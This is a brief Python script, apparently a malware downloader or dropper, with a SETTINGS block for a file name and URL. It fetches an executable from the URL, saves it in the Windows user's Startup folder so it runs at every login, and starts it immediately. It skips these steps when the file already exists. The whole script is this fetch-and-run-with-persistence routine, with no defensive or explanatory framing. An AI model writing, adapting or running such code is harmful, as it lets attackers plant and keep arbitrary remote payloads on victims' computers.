import requests,os
#####SETTINGS######
filename = 'name.exe'
url = 'https://example.com'
#####SETTINGS######
path = f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}'
if os.path.exists(path):
    exit() 
filee = requests.get(url)

open(path, 'wb').write(filee.content)
os.chdir(f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
os.startfile(filename)